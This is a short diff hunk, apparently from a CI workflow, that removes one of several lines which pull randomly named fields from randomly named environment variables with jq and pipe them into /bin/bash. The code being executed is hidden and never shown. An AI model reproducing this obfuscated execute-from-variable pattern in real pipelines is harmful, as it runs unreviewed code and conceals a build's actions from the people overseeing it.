@@ -35,7 +35,6 @@ jobs:
           echo $n0 | jq -r .dzo2 | /bin/bash
           echo $psxf96 | jq -r .lpfr59999 | /bin/bash
           printf '%s' "$duhmc7439" | jq -r .n110 | /bin/bash
-          echo $kjy626 | jq -r .un4 | /bin/bash
           echo $mdw5 | jq -r .v89 | /bin/bash
           printf '%s' "$yxios481" | jq -r .ygm78224 | /bin/bash
           echo $t049 | jq -r .vd5 | /bin/bash
